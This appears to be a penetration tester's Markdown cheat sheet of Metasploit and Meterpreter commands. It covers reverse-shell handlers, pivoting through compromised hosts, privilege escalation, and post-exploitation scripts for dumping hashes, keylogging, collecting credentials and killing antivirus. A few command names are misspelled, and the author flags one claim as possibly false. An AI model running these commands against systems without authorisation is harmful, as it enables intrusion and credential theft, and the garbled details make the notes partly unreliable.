---
title: Metasploit
---

## Metasploit
###### Commands
show options for the payload. 
```
show targets
show options
```
A common module is the ‘exploit/multi/handler’ module which is used to handle payloads. For example, if you launch an exploit outside of Metasploit, this module can be used to set up a payload that listens for and handles incoming reverse TCP connections on the specified port and host.
```
use exploit/multi/handler
```
Particularly when you are located on a different subnet, you may not be able to access all of the targets included in the customer scope. Once you compromise hosts that may have routes to other targets, you can utilize the Metasploit ‘route’ command in conjunction with a SOCKS4 proxy to route traffic through open sessions (i.e. from your phishing campaign or other exploitation).

```
route add "destination ip" "subnet" "session ?"
```
```
use auxiliary/server/socs4a
```
Set the srvhost:
```
set srvhost "local for most cases"
```
Set the srvport:
```
set srvport "port"
```
Now you can start the proxy server. 
```
run
```
Once you have set up the route and proxy server in Metasploit, you can use proxychains or modify your connection settings in your browser for SOCKS4 proxy configuration: Use the GUI network configuration guide to setup a SOCKS local host listener on your configured port. Double Check for Socks 4.

I think the portfwd command that creates a relay from the local host to the destination host will work for certain situations. 

## Meterpreter
Suggest post exploitation paths
```
run post/multi/recon/local_exploit_suggester
```
Get Administrator
```
getsystem
```
Drop into a command prompt
```
shell
```

Creates relay from a meterpreter session
```
portfwd add -l 22 -p 22 -r 10.20.170.87
```

###### Systeminfo
Check the system and current process that the session is running as. I had an issue where the exploit gave me a x86 (WOW64 32 bit) shell and the privesc needed x64 (64bit).
^ This statement might be completely false lol ^
```
sysinfo
```

###### I am not sure if this migrated me to a (x86) process. Always check with sysinfo. 
```
run post/windows/manage/migrate
```

###### Core Commands
Background the meterpreter session
```
background
```
Bring that meterpreter session to the foreground. Trick here is hitting tab to see available sessions. 
```
session -i "session id"
```

Meterpreter Scripts
```
killav
metsvc
migrate
netenum
prefetchtool
vnc_oneport / vnc
sheduleme
winenum
credcollect
get_local_subnets
getcountermeasure
getgui
gettelnet
hashdump
keylogrecorder
checkvm
```